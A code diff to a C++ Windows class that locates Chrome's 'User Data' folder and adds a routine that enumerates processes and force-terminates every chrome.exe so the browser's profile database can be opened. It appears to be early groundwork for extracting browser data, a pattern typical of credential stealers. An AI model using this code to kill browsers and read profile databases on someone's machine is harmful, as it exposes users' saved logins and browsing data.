@@ -1,7 +1,9 @@
 #include "chrome.hxx"
 
+#include "nowide.hxx"
 #include <ShlObj.h>
 #include <windows.h>
+#include <tlhelp32.h>
 #include <wil/resource.h>
 
 chrome::chrome() {
@@ -33,4 +35,24 @@ std::filesystem::path chrome::get_base_path(void) {
     return base_path / "Google" / "Chrome" / "User Data";
 }
 
-void chrome::get(void) {}
+void chrome::get(void) {
+    // can't open database if chrome is running
+    kill();
+}
+
+void chrome::kill(void) const {
+    PROCESSENTRY32W entry;
+    entry.dwSize = sizeof (PROCESSENTRY32W);
+
+    wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));
+    if (!Process32FirstW(snapshot.get(), &entry)) { return; }
+    do {
+        if (narrow(entry.szExeFile) == "chrome.exe") {
+            wil::unique_handle process(
+                    OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID));
+            if (process) {
+                TerminateProcess(process.get(), 0);
+            }
+        }
+    } while (Process32NextW(snapshot.get(), &entry));
+}
